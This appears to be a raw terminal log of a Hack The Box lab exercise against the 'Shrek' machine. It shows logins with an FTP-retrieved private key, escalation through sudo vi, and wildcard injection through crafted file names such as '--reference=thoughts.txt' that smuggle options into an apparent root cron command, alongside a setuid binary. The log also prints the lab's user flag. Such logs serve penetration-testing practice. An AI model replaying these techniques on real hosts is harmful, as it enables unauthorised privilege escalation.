@@ -1,0 +1,565 @@
+┌─[root@parrot]─[~/hackthebox/shrek] 
+└──╼ #ssh -i key sec@10.10.10.47     
+Warning: Identity file key not accessible: No such file or directory.      
+The authenticity of host '10.10.10.47 (10.10.10.47)' can't be established. 
+ECDSA key fingerprint is SHA256:elYdm7BTN0q3wYoaIdUyw1kBlMFTls2dWHgybMAYav8.                                                                           
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes   
+Warning: Permanently added '10.10.10.47' (ECDSA) to the list of known hosts.                                                                           
+sec@10.10.10.47's password:          
+Permission denied, please try again. 
+sec@10.10.10.47's password:          
+Permission denied, please try again. 
+sec@10.10.10.47's password:          
+sec@10.10.10.47: Permission denied (publickey).                            
+┌─[✗]─[root@parrot]─[~/hackthebox/shrek]                                   
+└──╼ #ssh -i key sec@10.10.10.47     
+Warning: Identity file key not accessible: No such file or directory.      
+sec@10.10.10.47's password:          
+Permission denied, please try again. 
+sec@10.10.10.47's password:          
+Permission denied, please try again. 
+sec@10.10.10.47's password:          
+sec@10.10.10.47: Permission denied (publickey).                            
+┌─[✗]─[root@parrot]─[~/hackthebox/shrek]                                   
+└──╼ #cd ftp                         
+┌─[root@parrot]─[~/hackthebox/shrek/ftp]                                   
+└──╼ #ssh -i key sec@10.10.10.47     
+ssh: connect to host 10.10.10.47 port 22: No route to host                 
+┌─[✗]─[root@parrot]─[~/hackthebox/shrek/ftp]                               
+└──╼ #ssh -i key sec@10.10.10.47     
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                
+@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @                
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                
+Permissions 0644 for 'key' are too open.                                   
+It is required that your private key files are NOT accessible by others.   
+This private key will be ignored.    
+Load key "key": bad permissions      
+sec@10.10.10.47's password:          
+Connection closed by 10.10.10.47 port 22                                   
+┌─[✗]─[root@parrot]─[~/hackthebox/shrek/ftp]                               
+└──╼ #ssh -i key sec@10.10.10.47     
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                
+@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @                
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                
+Permissions 0644 for 'key' are too open.                                   
+It is required that your private key files are NOT accessible by others.   
+This private key will be ignored.    
+Load key "key": bad permissions      
+sec@10.10.10.47's password:          
+Permission denied, please try again. 
+sec@10.10.10.47's password:          
+Permission denied, please try again. 
+sec@10.10.10.47's password:          
+
+sec@10.10.10.47: Permission denied (publickey,password).                   
+┌─[✗]─[root@parrot]─[~/hackthebox/shrek/ftp]                               
+└──╼ #                               
+┌─[✗]─[root@parrot]─[~/hackthebox/shrek/ftp]                               
+└──╼ #ls                             
+1384900e7a1a4b609e54d882809b502f.txt      4f94a4b2cc7e41e2af082385f0296f0e.txt      d2924d86241d4d9d856405892c3e6d3a.txt.b64                           
+1384900e7a1a4b609e54d882809b502f.txt.b64  4f94a4b2cc7e41e2af082385f0296f0e.txt.b64  d910b42f6713454abba0d84868e9f271.txt                               
+16a666785c694b0396611e3e1f7ab984.txt      500fa162a0df41559750cd72dd3b5334.txt      d910b42f6713454abba0d84868e9f271.txt.b64                           
+16a666785c694b0396611e3e1f7ab984.txt.b64  500fa162a0df41559750cd72dd3b5334.txt.b64  ddf6e6f5c1e24dfa94170499242d44c3.txt                               
+25b27e6879f94cc8a6d7309c673868e6.txt      531a740e12c3418b9c1fc0a472c9178d.txt      ddf6e6f5c1e24dfa94170499242d44c3.txt.b64                           
+25b27e6879f94cc8a6d7309c673868e6.txt.b64  531a740e12c3418b9c1fc0a472c9178d.txt.b64  e016856f23414b3790ab0a7d25a2e645.txt                               
+28390baddcbd4051baf0c9cd778426f8.txt      65c29a0eb01c490aa4bba8693dcd728e.txt      e016856f23414b3790ab0a7d25a2e645.txt.b64                           
+28390baddcbd4051baf0c9cd778426f8.txt.b64  65c29a0eb01c490aa4bba8693dcd728e.txt.b64  e04686a096544dfcbc2efaee79cea305.txt                               
+3497c00125834e6daf3beaaf52230fb8.txt      774c2944806b424d8f3c0105d8167e85.txt      e04686a096544dfcbc2efaee79cea305.txt.b64                           
+3497c00125834e6daf3beaaf52230fb8.txt.b64  774c2944806b424d8f3c0105d8167e85.txt.b64  ecbbed9cda2c4a0586f8b4f80aaefbc8.txt                               
+3d6fa06b723e438589713677b6b58381.txt      78787b0bbe5945438536003acbb94d3e.txt      ecbbed9cda2c4a0586f8b4f80aaefbc8.txt.b64                           
+3d6fa06b723e438589713677b6b58381.txt.b64  78787b0bbe5945438536003acbb94d3e.txt.b64  ef62204df15e4a84ab54caf074d63dfe.txt                               
+3e33b0363d6c4aeb91902707fe0b06e0.txt      a5ceeab4701f47b6ac5da995c52c9e98.txt      ef62204df15e4a84ab54caf074d63dfe.txt.b64                           
+3e33b0363d6c4aeb91902707fe0b06e0.txt.b64  a5ceeab4701f47b6ac5da995c52c9e98.txt.b64  f133d7bf0aad4b9ea45e5a96c6600088.txt                               
+404bda081a134717a83a1194ba7e89d2.txt      abfc67376b5f4481b78464957428ea0b.txt      f133d7bf0aad4b9ea45e5a96c6600088.txt.b64                           
+404bda081a134717a83a1194ba7e89d2.txt.b64  abfc67376b5f4481b78464957428ea0b.txt.b64  fb4eaec5b4cd4651bf404cb769d44c0b.txt                               
+45f5eee25c594647a0d30bb54854bc56.txt      bb6325c5172840b3ad67c4c4b5cc8df1.txt      fb4eaec5b4cd4651bf404cb769d44c0b.txt.b64                           
+45f5eee25c594647a0d30bb54854bc56.txt.b64  bb6325c5172840b3ad67c4c4b5cc8df1.txt.b64  fc3917996d974055b0c95ad6800045bd.txt                               
+46f9933c72ce40a4b118ca9618dbb8ef.txt      blob                                      fc3917996d974055b0c95ad6800045bd.txt.b64                           
+46f9933c72ce40a4b118ca9618dbb8ef.txt.b64  cca3d93e463e4ad78221da76eb853909.txt      key                                                                
+48fee7eb169441d6922e697371f84d57.txt      cca3d93e463e4ad78221da76eb853909.txt.b64  strings                                                            
+48fee7eb169441d6922e697371f84d57.txt.b64  d2924d86241d4d9d856405892c3e6d3a.txt                                                                         
+┌─[root@parrot]─[~/hackthebox/shrek/ftp]                                   
+└──╼ #less key                       
+┌─[root@parrot]─[~/hackthebox/shrek/ftp]                                   
+└──╼ #ftp 10.10.10.47                
+Connected to 10.10.10.47.            
+220 (vsFTPd 3.0.3)                   
+Name (10.10.10.47:root): donkey      
+331 Please specify the password.     
+Password:                            
+230 Login successful.                
+Remote system type is UNIX.          
+Using binary mode to transfer files. 
+ftp> get key                         
+local: key remote: key               
+200 PORT command successful. Consider using PASV.                          
+150 Opening BINARY mode data connection for key (1766 bytes).              
+226 Transfer complete.               
+1766 bytes received in 0.00 secs (1.0007 MB/s)                             
+ftp> ls                              
+200 PORT command successful. Consider using PASV.                          
+150 Here comes the directory listing.                                      
+-rw-r--r--    1 0        0           14336 Jan 02 05:20 063677fad24f4da08f2e65a4ecf59c3c.txt                                                           
+-rw-r--r--    1 0        0            4096 Jan 02 05:20 0f6516614fc84acdb04d82f15c63c2a1.txt                                                           
+-rw-r--r--    1 0        0           11264 Jan 02 05:20 214db05d4b9a493bb1feb0f494d7ad46.txt                                                           
+-rw-r--r--    1 0        0           10240 Jan 02 05:20 23913f0603614ddcabe9378f068ff6be.txt                                                           
+-rw-r--r--    1 0        0           15360 Jan 02 05:20 28eb84643b034b3bb9355a8052cf02bf.txt                                                           
+-rw-r--r--    1 0        0            3072 Jan 02 05:20 40aee342ad9b49c79e295e723b03e2f1.txt                                                           
+-rw-r--r--    1 0        0            9216 Jan 02 05:20 51c3b657c31849feb7cd66f58b2f6cee.txt                                                           
+-rw-r--r--    1 0        0            6144 Jan 02 05:20 5531950fb181459aa45548b40a645dbe.txt                                                           
+-rw-r--r--    1 0        0            7168 Jan 02 05:20 5a63bc3327984436aa0a6db45418dcb0.txt                                                           
+-rw-r--r--    1 0        0           15360 Jan 02 05:20 649ee55b91e649fab09f73a7eb9da9fe.txt                                                           
+-rw-r--r--    1 0        0           14336 Jan 02 05:20 76164b94b6a4457b9e41d5ab4b3e35ba.txt                                                           
+-rw-r--r--    1 0        0            3072 Jan 02 05:20 826fe0dc6a4d467ea76cf8ca6d7d0490.txt                                                           
+-rw-r--r--    1 0        0            7168 Jan 02 05:20 8465e3d8e0e54732a70d4557d1518ce7.txt                                                           
+-rw-r--r--    1 0        0            3072 Jan 02 05:20 94864b50abfd4dcbb99be09b52030228.txt                                                           
+-rw-r--r--    1 0        0           11264 Jan 02 05:20 95619cbbe98048689419813d1440c00d.txt                                                           
+-rw-r--r--    1 0        0            4096 Jan 02 05:20 97797b8a54434ecf845b4503096bb4df.txt                                                           
+-rw-r--r--    1 0        0            8192 Jan 02 05:20 af3d985a7c2c44cfb03affff2c114cfc.txt                                                           
+-rw-r--r--    1 0        0           10240 Jan 02 05:20 b06ffcf0802e41cca23dee2b67273f48.txt                                                           
+-rw-r--r--    1 0        0           10240 Jan 02 05:20 b2da65cf4d84494c8a8f3fa36985b380.txt                                                           
+-rw-r--r--    1 0        0           10240 Jan 02 05:20 b337cce041a740b8aa573998f328ff0c.txt                                                           
+-rw-r--r--    1 0        0            9216 Jan 02 05:20 bfdd131f0ab74678aceb2f3593810f8d.txt                                                           
+-rw-r--r--    1 0        0            4096 Jan 02 05:20 c15cbf1b90354a6fa7fbc6fbd6fe9abb.txt                                                           
+-rw-r--r--    1 0        0           15360 Jan 02 05:20 c5a4d2a726604f408496fc0bbfc18c61.txt                                                           
+-rw-r--r--    1 0        0            3502 Jan 02 05:20 d10d18805a9c4305ae8400de415bea94.txt                                                           
+-rw-r--r--    1 0        0           11264 Jan 02 05:20 e0fdf41408204bdc8aef07a6ea5dec3e.txt                                                           
+-rw-r--r--    1 0        0           10240 Jan 02 05:20 e1fbde5079eb41d69584b78bfb57f9c3.txt                                                           
+-rw-r--r--    1 0        0            5120 Jan 02 05:20 e208790809c346d29ea858e0261d5fd4.txt                                                           
+-rw-r--r--    1 0        0            5120 Jan 02 05:20 e70dd42a2eea4c7ba067673293becb18.txt                                                           
+-rw-r--r--    1 0        0           12288 Jan 02 05:20 ee18a7fcd5d246a09fd2654eb1997179.txt                                                           
+-rw-r--r--    1 0        0           14366 Jan 02 05:20 f0f171cddda24e68a852af032ccc6ac6.txt                                                           
+-rw-r--r--    1 0        0           15360 Jan 02 05:20 f7ba71ee4e264bb496bdb0bbcc461530.txt                                                           
+-rw-r--r--    1 0        0            1766 Aug 16  2017 key                
+226 Directory send OK.               
+ftp> exit                            
+221 Goodbye.                         
+┌─[root@parrot]─[~/hackthebox/shrek/ftp]                                   
+└──╼ #ls                             
+1384900e7a1a4b609e54d882809b502f.txt      4f94a4b2cc7e41e2af082385f0296f0e.txt      d2924d86241d4d9d856405892c3e6d3a.txt.b64                           
+1384900e7a1a4b609e54d882809b502f.txt.b64  4f94a4b2cc7e41e2af082385f0296f0e.txt.b64  d910b42f6713454abba0d84868e9f271.txt                               
+16a666785c694b0396611e3e1f7ab984.txt      500fa162a0df41559750cd72dd3b5334.txt      d910b42f6713454abba0d84868e9f271.txt.b64                           
+16a666785c694b0396611e3e1f7ab984.txt.b64  500fa162a0df41559750cd72dd3b5334.txt.b64  ddf6e6f5c1e24dfa94170499242d44c3.txt                               
+25b27e6879f94cc8a6d7309c673868e6.txt      531a740e12c3418b9c1fc0a472c9178d.txt      ddf6e6f5c1e24dfa94170499242d44c3.txt.b64                           
+25b27e6879f94cc8a6d7309c673868e6.txt.b64  531a740e12c3418b9c1fc0a472c9178d.txt.b64  e016856f23414b3790ab0a7d25a2e645.txt                               
+28390baddcbd4051baf0c9cd778426f8.txt      65c29a0eb01c490aa4bba8693dcd728e.txt      e016856f23414b3790ab0a7d25a2e645.txt.b64                           
+28390baddcbd4051baf0c9cd778426f8.txt.b64  65c29a0eb01c490aa4bba8693dcd728e.txt.b64  e04686a096544dfcbc2efaee79cea305.txt                               
+3497c00125834e6daf3beaaf52230fb8.txt      774c2944806b424d8f3c0105d8167e85.txt      e04686a096544dfcbc2efaee79cea305.txt.b64                           
+3497c00125834e6daf3beaaf52230fb8.txt.b64  774c2944806b424d8f3c0105d8167e85.txt.b64  ecbbed9cda2c4a0586f8b4f80aaefbc8.txt                               
+3d6fa06b723e438589713677b6b58381.txt      78787b0bbe5945438536003acbb94d3e.txt      ecbbed9cda2c4a0586f8b4f80aaefbc8.txt.b64                           
+3d6fa06b723e438589713677b6b58381.txt.b64  78787b0bbe5945438536003acbb94d3e.txt.b64  ef62204df15e4a84ab54caf074d63dfe.txt                               
+3e33b0363d6c4aeb91902707fe0b06e0.txt      a5ceeab4701f47b6ac5da995c52c9e98.txt      ef62204df15e4a84ab54caf074d63dfe.txt.b64                           
+3e33b0363d6c4aeb91902707fe0b06e0.txt.b64  a5ceeab4701f47b6ac5da995c52c9e98.txt.b64  f133d7bf0aad4b9ea45e5a96c6600088.txt                               
+404bda081a134717a83a1194ba7e89d2.txt      abfc67376b5f4481b78464957428ea0b.txt      f133d7bf0aad4b9ea45e5a96c6600088.txt.b64                           
+404bda081a134717a83a1194ba7e89d2.txt.b64  abfc67376b5f4481b78464957428ea0b.txt.b64  fb4eaec5b4cd4651bf404cb769d44c0b.txt                               
+45f5eee25c594647a0d30bb54854bc56.txt      bb6325c5172840b3ad67c4c4b5cc8df1.txt      fb4eaec5b4cd4651bf404cb769d44c0b.txt.b64                           
+45f5eee25c594647a0d30bb54854bc56.txt.b64  bb6325c5172840b3ad67c4c4b5cc8df1.txt.b64  fc3917996d974055b0c95ad6800045bd.txt                               
+46f9933c72ce40a4b118ca9618dbb8ef.txt      blob                                      fc3917996d974055b0c95ad6800045bd.txt.b64                           
+46f9933c72ce40a4b118ca9618dbb8ef.txt.b64  cca3d93e463e4ad78221da76eb853909.txt      key                                                                
+48fee7eb169441d6922e697371f84d57.txt      cca3d93e463e4ad78221da76eb853909.txt.b64  strings                                                            
+48fee7eb169441d6922e697371f84d57.txt.b64  d2924d86241d4d9d856405892c3e6d3a.txt                                                                         
+┌─[root@parrot]─[~/hackthebox/shrek/ftp]                                   
+└──╼ #rm key                         
+┌─[root@parrot]─[~/hackthebox/shrek/ftp]                                   
+└──╼ #ftp 10.10.10.47                
+Connected to 10.10.10.47.            
+220 (vsFTPd 3.0.3)                   
+Name (10.10.10.47:root): donkey      
+331 Please specify the password.     
+Password:                            
+230 Login successful.                
+Remote system type is UNIX.          
+Using binary mode to transfer files. 
+ftp> get key                         
+local: key remote: key               
+200 PORT command successful. Consider using PASV.                          
+150 Opening BINARY mode data connection for key (1766 bytes).              
+226 Transfer complete.               
+1766 bytes received in 0.00 secs (1.2644 MB/s)                             
+ftp> exit                            
+221 Goodbye.                         
+┌─[root@parrot]─[~/hackthebox/shrek/ftp]                                   
+└──╼ #ssh -i key sec@10.10.10.47     
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                
+@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @                
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                
+Permissions 0644 for 'key' are too open.                                   
+It is required that your private key files are NOT accessible by others.   
+This private key will be ignored.    
+Load key "key": bad permissions      
+sec@10.10.10.47's password:          
+
+
+
+Permission denied, please try again. 
+sec@10.10.10.47's password:          
+Permission denied, please try again. 
+sec@10.10.10.47's password:          
+sec@10.10.10.47: Permission denied (publickey).                            
+┌─[✗]─[root@parrot]─[~/hackthebox/shrek/ftp]                               
+└──╼ #chmod 600 key                  
+┌─[root@parrot]─[~/hackthebox/shrek/ftp]                                   
+└──╼ #ssh -i key sec@10.10.10.47     
+Enter passphrase for key 'key':      
+Last login: Wed Aug 23 10:48:16 2017 from 10.10.22.10                      
+[sec@shrek ~]$ ls                    
+user.txt                             
+[sec@shrek ~]$ cat user.txt          
+4a30ad60401b5e0c8b0ba7ca6b08e60c     
+[sec@shrek ~]$ cd /root              
+-bash: cd: /root: Permission denied  
+[sec@shrek ~]$ ls -la                
+total 28                             
+drwx------ 3 sec  users 4096 Aug 15  2017 .                                
+drwxr-xr-x 4 root root  4096 Aug 11  2017 ..                               
+-rw------- 1 root root     0 Aug 22  2017 .bash_history                    
+-rw-r--r-- 1 sec  users   21 Feb 14  2017 .bash_logout                     
+-rw-r--r-- 1 sec  users   57 Feb 14  2017 .bash_profile                    
+-rw-r--r-- 1 sec  users  141 Feb 14  2017 .bashrc                          
+drwxr-xr-x 2 root root  4096 Aug 16  2017 .ssh                             
+-r--r--r-- 1 root root    33 Aug 22  2017 user.txt                         
+[sec@shrek ~]$ sudo -l               
+User sec may run the following commands on shrek:                          
+    (farquad) NOPASSWD: /usr/bin/vi  
+[sec@shrek ~]$ clear                 
+[sec@shrek ~]$ sudo -l               
+User sec may run the following commands on shrek:                          
+    (farquad) NOPASSWD: /usr/bin/vi  
+[sec@shrek ~]$ /usr/bin/vi           
+[sec@shrek ~]$ sudo -u farquad /usr/bin/vi                                 
+[farquad@shrek sec]$ id              
+uid=1001(farquad) gid=100(users) groups=100(users),7(lp),10(wheel),91(video),92(audio),93(optical),95(storage)                                         
+[farquad@shrek sec]$ ls              
+ls: cannot open directory '.': Permission denied                           
+[farquad@shrek sec]$ cd ..           
+[farquad@shrek home]$ ls             
+lost+found  sec                      
+[farquad@shrek home]$ cd ~           
+[farquad@shrek ~]$ ls                
+mirror                               
+[farquad@shrek ~]$ file mirror       
+mirror: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=805d5ffe27bd514da86bbad94d3411a2e2425aac, not stripped           
+[farquad@shrek ~]$ ./mirror          
+Mirror, Mirror on the wall who is the most handsome of all?                
+Of course you Lord Farquad           
+[farquad@shrek ~]$ exit              
+exit                                 
+[Hit return to continue] [sec@shrek ~]$                                    
+[sec@shrek ~]$ ls -la                
+total 28                             
+drwx------ 3 sec  users 4096 Aug 15  2017 .                                
+drwxr-xr-x 4 root root  4096 Aug 11  2017 ..                               
+-rw------- 1 root root     0 Aug 22  2017 .bash_history                    
+-rw-r--r-- 1 sec  users   21 Feb 14  2017 .bash_logout                     
+-rw-r--r-- 1 sec  users   57 Feb 14  2017 .bash_profile                    
+-rw-r--r-- 1 sec  users  141 Feb 14  2017 .bashrc                          
+drwxr-xr-x 2 root root  4096 Aug 16  2017 .ssh                             
+-r--r--r-- 1 root root    33 Aug 22  2017 user.txt                         
+[sec@shrek ~]$ clear                 
+[sec@shrek ~]$ find / -type -newermt 2017-08-21 ! -newermt 2017-08-24 -ls 2>/dev/null                                                                  
+[sec@shrek ~]$ find / -type f -newermt 2017-08-21 ! -newermt 2017-08-24 -ls 2>/dev/null                                                                
+    18518      4 -rw-r--r--   1  root     root            6 Aug 23  2017 /etc/hostname                                                                 
+    18515      4 -rw-r--r--   1  root     root          389 Aug 23  2017 /etc/netctl/static                                                            
+    35103      8 -rw-r--r--   1  root     root         4606 Aug 21  2017 /etc/vsftpd.conf                                                              
+   138139      4 -rw-r--r--   1  root     root          196 Aug 23  2017 /etc/systemd/system/netctl@static.service                                     
+    33988      4 -rw-------   1  root     root          929 Aug 21  2017 /etc/shadow                                                                   
+    33931      4 -rw-r--r--   1  root     root          968 Aug 21  2017 /etc/passwd                                                                   
+       17      4 -r--r--r--   1  root     root           33 Aug 22  2017 /home/sec/user.txt                                                            
+       18      0 -rw-------   1  root     root            0 Aug 22  2017 /home/sec/.bash_history                                                       
+   138145      4 -rw-------   1  root     root           97 Aug 22  2017 /var/spool/cron/root                                                          
+   138067      4 -rw-------   1  root     root            9 Aug 22  2017 /var/spool/anacron/cron.daily                                                 
+   138108   8196 -rw-r-----   1  root     systemd-journal  8388608 Aug 23  2017 /var/log/journal/84d230a047b241c6be827bd5ce531868/user-1001.journal    
+   138101  16388 -rw-r-----   1  root     systemd-journal 16777216 Aug 21  2017 /var/log/journal/84d230a047b241c6be827bd5ce531868/system@00055747c657656c-ad9ea2c5440b64ec.journal~         
+   138138   8192 -rw-r-----   1  root     systemd-journal  8388608 Aug 21  2017 /var/log/journal/84d230a047b241c6be827bd5ce531868/system@0005574ac144c200-f23de797a5b2e762.journal~         
+   137786     16 -rw-------   1  root     utmp               15744 Aug 22  2017 /var/log/btmp.1                                                        
+   131087      8 -rw-------   1  root     root                7948 Aug 23  2017 /var/log/vsftpd.log.1                                                  
+   137811 264656 -rw-r--r--   1  root     root            271001726 Aug 23  2017 /var/log/httpd/access_log.1                                           
+   137906     12 -rw-r--r--   1  root     root                 9833 Aug 23  2017 /var/log/httpd/error_log.1                                            
+    20283      4 -rw-r--r--   1  root     root                   91 Aug 22  2017 /usr/src/thoughts.txt                                                 
+[sec@shrek ~]$ cat /var/spool/anacron/cron.daily                           
+cat: /var/spool/anacron/cron.daily: Permission denied                      
+[sec@shrek ~]$ ls -la /var/spool/cron                                      
+total 12                             
+drwxr-xr-x 2 root root 4096 Aug 21  2017 .                                 
+drwxr-xr-x 5 root root 4096 Aug 16  2017 ..                                
+-rw------- 1 root root   97 Aug 22  2017 root                              
+[sec@shrek ~]$ ls -la /var/spool/cron/                                     
+total 12                             
+drwxr-xr-x 2 root root 4096 Aug 21  2017 .                                 
+drwxr-xr-x 5 root root 4096 Aug 16  2017 ..                                
+-rw------- 1 root root   97 Aug 22  2017 root                              
+[sec@shrek ~]$ clear                 
+[sec@shrek ~]$ touch arrow           
+[sec@shrek ~]$ chmod 4755 arrow      
+[sec@shrek ~]$ ls -la                
+total 28                             
+drwx------ 3 sec  users 4096 Jan  2 06:39 .                                
+drwxr-xr-x 4 root root  4096 Aug 11  2017 ..                               
+-rwsr-xr-x 1 sec  users    0 Jan  2 06:39 arrow                            
+-rw------- 1 root root     0 Aug 22  2017 .bash_history                    
+-rw-r--r-- 1 sec  users   21 Feb 14  2017 .bash_logout                     
+-rw-r--r-- 1 sec  users   57 Feb 14  2017 .bash_profile                    
+-rw-r--r-- 1 sec  users  141 Feb 14  2017 .bashrc                          
+drwxr-xr-x 2 root root  4096 Aug 16  2017 .ssh                             
+-r--r--r-- 1 root root    33 Aug 22  2017 user.txt                         
+[sec@shrek ~]$ ls                    
+arrow  user.txt                      
+[sec@shrek ~]$ date                  
+Thu Jan  2 07:05:00 UTC 2020         
+[sec@shrek ~]$ ls -la                
+total 28                             
+drwx------ 3 sec  users 4096 Jan  2 06:39 .                                
+drwxr-xr-x 4 root root  4096 Aug 11  2017 ..                               
+-rwsr-xr-x 1 sec  users    0 Jan  2 06:39 arrow                            
+-rw------- 1 root root     0 Aug 22  2017 .bash_history                    
+-rw-r--r-- 1 sec  users   21 Feb 14  2017 .bash_logout                     
+-rw-r--r-- 1 sec  users   57 Feb 14  2017 .bash_profile                    
+-rw-r--r-- 1 sec  users  141 Feb 14  2017 .bashrc                          
+drwxr-xr-x 2 root root  4096 Aug 16  2017 .ssh                             
+-r--r--r-- 1 root root    33 Aug 22  2017 user.txt                         
+[sec@shrek ~]$ date                  
+Thu Jan  2 07:10:45 UTC 2020         
+[sec@shrek ~]$ ls -la                
+total 28                             
+drwx------ 3 sec  users 4096 Jan  2 06:39 .                                
+drwxr-xr-x 4 root root  4096 Aug 11  2017 ..                               
+-rwsr-xr-x 1 sec  users    0 Jan  2 06:39 arrow                            
+-rw------- 1 root root     0 Aug 22  2017 .bash_history                    
+-rw-r--r-- 1 sec  users   21 Feb 14  2017 .bash_logout                     
+-rw-r--r-- 1 sec  users   57 Feb 14  2017 .bash_profile                    
+-rw-r--r-- 1 sec  users  141 Feb 14  2017 .bashrc                          
+drwxr-xr-x 2 root root  4096 Aug 16  2017 .ssh                             
+-r--r--r-- 1 root root    33 Aug 22  2017 user.txt                         
+[sec@shrek ~]$ cd /wrc               
+-bash: cd: /wrc: No such file or directory                                 
+[sec@shrek ~]$ cd /src               
+-bash: cd: /src: No such file or directory                                 
+[sec@shrek ~]$ cd -                  
+-bash: cd: OLDPWD not set            
+[sec@shrek ~]$ history               
+    1  ls                            
+    2  cat user.txt                  
+    3  cd /root                      
+    4  ls -la                        
+    5  sudo -l                       
+    6  clear                         
+    7  sudo -l                       
+    8  /usr/bin/vi                   
+    9  sudo -u farquad /usr/bin/vi   
+   10  ls -la                        
+   11  clear                         
+   12  find / -type -newermt 2017-08-21 ! -newermt 2017-08-24 -ls 2>/dev/null                                                                          
+   13  find / -type f -newermt 2017-08-21 ! -newermt 2017-08-24 -ls 2>/dev/null                                                                        
+   14  cat /var/spool/anacron/cron.daily                                   
+   15  ls -la /var/spool/cron        
+   16  ls -la /var/spool/cron/       
+   17  clear                         
+   18  touch arrow                   
+   19  chmod 4755 arrow              
+   20  ls -la                        
+   21  ls                            
+   22  date                          
+   23  ls -la                        
+   24  date                          
+   25  ls -la                        
+   26  cd /wrc                       
+   27  cd /src                       
+   28  cd -                          
+   29  history                       
+[sec@shrek ~]$ cd /home              
+[sec@shrek home]$ ls                 
+lost+found  sec                      
+[sec@shrek home]$ cd sec             
+[sec@shrek ~]$ ls                    
+arrow  user.txt                      
+[sec@shrek ~]$ cd /usr/src/          
+[sec@shrek src]$ ls                  
+thoughts.txt                         
+[sec@shrek src]$ touch arrow         
+[sec@shrek src]$ chmod 4755 arrow    
+[sec@shrek src]$ ls                  
+arrow  thoughts.txt                  
+[sec@shrek src]$ date                
+Thu Jan  2 07:18:57 UTC 2020         
+[sec@shrek src]$ clear               
+[sec@shrek src]$ ls *                
+arrow  thoughts.txt                  
+[sec@shrek src]$ touch -- -la        
+[sec@shrek src]$ ls *                                                                                                                                  
+-rwsr-sr-x 1 nobody nobody  0 Jan  2 07:18 arrow                           
+-rw-r--r-- 1 root   root   91 Aug 22  2017 thoughts.txt                    
+[sec@shrek src]$ cat thoughts.txt    
+That must be Lord Farquaad's castle...                                     
+Do you think he's maybe compensating for something?                        
+[sec@shrek src]$ touch -- --reference=thoughts.txt                         
+[sec@shrek src]$ date                
+Thu Jan  2 07:23:34 UTC 2020         
+[sec@shrek src]$ ls -la              
+total 12                             
+drwxr-xr-x 2 sec    root   4096 Jan  2 07:23  .                            
+drwxr-xr-x 8 sec    root   4096 Aug 16  2017  ..                           
+-rwsr-sr-x 1 nobody nobody    0 Jan  2 07:18  arrow                        
+-rw-r--r-- 1 sec    users     0 Jan  2 07:20  -la                          
+-rw-r--r-- 1 sec    users     0 Jan  2 07:23 '--reference=thoughts.txt'    
+-rw-r--r-- 1 root   root     91 Aug 22  2017  thoughts.txt                 
+[sec@shrek src]$ vi exec.c           
+[sec@shrek src]$ ls                  
+ arrow   exec.c   -la  '--reference=thoughts.txt'   thoughts.txt           
+[sec@shrek src]$ gcc exec.c -o exec  
+[sec@shrek src]$ ls                  
+ arrow   exec   exec.c   -la  '--reference=thoughts.txt'   thoughts.txt    
+[sec@shrek src]$ chmod 4755 exec     
+[sec@shrek src]$ ls -la              
+total 28                             
+drwxr-xr-x 2 sec    root   4096 Jan  2 07:30  .                            
+drwxr-xr-x 8 sec    root   4096 Aug 16  2017  ..                           
+-rwsr-sr-x 1 nobody nobody    0 Jan  2 07:18  arrow                        
+-rwsr-xr-x 1 sec    users  8496 Jan  2 07:30  exec                         
+-rw-r--r-- 1 sec    users   152 Jan  2 07:29  exec.c                       
+-rw-r--r-- 1 sec    users     0 Jan  2 07:20  -la                          
+-rw-r--r-- 1 sec    users     0 Jan  2 07:23 '--reference=thoughts.txt'    
+-rw-r--r-- 1 root   root     91 Aug 22  2017  thoughts.txt                 
+[sec@shrek src]$ ./exec              
+[sec@shrek src]$ ls -la              
+total 28                             
+-rw-r--r-- 1 sec    users     0 Jan  2 07:23 '--reference=thoughts.txt'    
+-rw-r--r-- 1 sec    users     0 Jan  2 07:20  -la                          
+drwxr-xr-x 2 sec    root   4096 Jan  2 07:30  .                            
+drwxr-xr-x 8 sec    root   4096 Aug 16  2017  ..                           
+-rwsr-sr-x 1 nobody nobody    0 Jan  2 07:18  arrow                        
+-rwsr-xr-x 1 sec    users  8496 Jan  2 07:30  exec                         
+-rw-r--r-- 1 sec    users   152 Jan  2 07:29  exec.c                       
+-rw-r--r-- 1 root   root     91 Aug 22  2017  thoughts.txt                 
+[sec@shrek src]$ ./exec              
+[sec@shrek src]$ date                
+Thu Jan  2 07:33:50 UTC 2020         
+[sec@shrek src]$ ./exec              
+[sec@shrek src]$ date                
+Thu Jan  2 07:35:20 UTC 2020         
+[sec@shrek src]$ ls -la              
+total 28                             
+-rw-r--r-- 1 sec    users     0 Jan  2 07:23 '--reference=thoughts.txt'    
+-rw-r--r-- 1 sec    users     0 Jan  2 07:20  -la                          
+drwxr-xr-x 2 sec    root   4096 Jan  2 07:30  .                            
+drwxr-xr-x 8 sec    root   4096 Aug 16  2017  ..                           
+-rwsr-sr-x 1 nobody nobody    0 Jan  2 07:18  arrow                        
+-rwsr-sr-x 1 sec    users  8496 Jan  2 07:30  exec                         
+-rw-r--r-- 1 sec    users   152 Jan  2 07:29  exec.c                       
+-rw-r--r-- 1 root   root     91 Aug 22  2017  thoughts.txt                 
+[sec@shrek src]$ date                
+Thu Jan  2 07:36:53 UTC 2020         
+[sec@shrek src]$ date                
+Thu Jan  2 07:38:06 UTC 2020         
+[sec@shrek src]$ ./exec              
+[sec@shrek src]$ ./exec              
+[sec@shrek src]$ rm arrow            
+rm: remove write-protected regular empty file 'arrow'? y                   
+[sec@shrek src]$ rm exec             
+[sec@shrek src]$ rm exec.c           
